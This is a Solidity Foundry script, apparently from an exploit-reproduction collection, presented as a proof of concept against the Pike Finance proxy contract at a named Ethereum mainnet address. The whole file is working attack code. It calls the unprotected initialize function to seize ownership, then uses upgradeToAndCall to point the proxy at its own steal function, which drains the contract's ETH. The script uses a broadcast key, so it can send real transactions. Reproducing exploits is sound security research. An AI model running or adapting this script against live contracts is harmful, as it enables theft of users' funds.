// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level0.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface PikeFinanceInterface {
    function initialize(address, address, address, address, uint256, uint256) external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract PikeFinanceExploit is Script {
    uint256 forkBlockNum = 19_771_058;
    address PikeFinance = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function run() external {
        vm.deal(address(this), 0);
        vm.createSelectFork("https://eth.llamarpc.com", forkBlockNum);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Start Pike Finance Exploit PoC");
        console.log("Contract Balance : ", address(this).balance);
        console.log("Pike Finance Balance : ", address(PikeFinance).balance);
        console.log();

        address owner = address(this);
        address WNativeAddress = address(this);
        address uniswapHelperAddress = address(this);
        address tokenAddress = address(this);

        console.log("Pike Finance initializing...");
        
        PikeFinanceInterface(PikeFinance).initialize(owner, WNativeAddress, uniswapHelperAddress, tokenAddress, 20, 20);

        console.log("Pike Finance initializing success");
        console.log("Pike Finance upgradeToAndCall...");

        PikeFinanceInterface(PikeFinance).upgradeToAndCall(address(this), abi.encodeWithSignature("steal(address)", address(this)));

        console.log("Pike Finance upgradeToAndCall success");

        console.log("Finish Pike Finance Exploit PoC");
        console.log("Contract Balance : ", address(this).balance);
        console.log("Pike Finance Balance : ", address(PikeFinance).balance);

        vm.stopBroadcast();
    }

    function steal(address _address) external {
        payable(_address).call{value: address(this).balance}("");
    }

    function proxiableUUID() external pure returns(bytes32){
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}